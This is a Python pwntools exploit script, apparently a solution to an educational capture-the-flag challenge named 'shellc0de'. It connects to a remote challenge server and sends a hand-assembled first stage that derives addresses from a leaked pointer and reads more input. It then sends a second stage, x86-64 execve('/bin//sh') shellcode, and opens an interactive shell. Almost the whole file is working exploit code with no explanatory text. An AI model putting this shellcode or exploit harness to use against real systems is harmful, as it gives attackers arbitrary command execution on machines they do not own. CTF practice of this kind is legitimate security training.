#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

local = False
elf = 'shellc0de' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10150
    r = remote(ip,port)

context.arch = 'amd64'


getread =  asm('''
leak:
pop rax
mov R9, 0xffffffffffffffff
shl R9, 12
mov rbx, 0xfffffffffffff750
and rax, R9
mov R11, rax
xor R9, 0xffffffffffffffff
and rbx, R9
add rax, rbx
mov R10, rax
mov rbx, 0xfffffffffffff9be
and rbx, R9
add R11, rbx
mov R14, R11
lea rax, [rbp-0x110]
xor edx, edx
inc edx
shl edx, 8
mov rsi, rax
xor edi, edi
call R10
jmp R14
''')

shellcode = asm('''
    push 0
    mov rsi,0x68732f2f6e69622f
    push rsi
    mov rdi,rsp
    xor rsi,rsi
    xor rdx,rdx
    mov rax,59
    syscall
''')

raw_input("aaa")
print r.recv()
r.sendline(getread)
r.sendline(shellcode)
r.interactive()
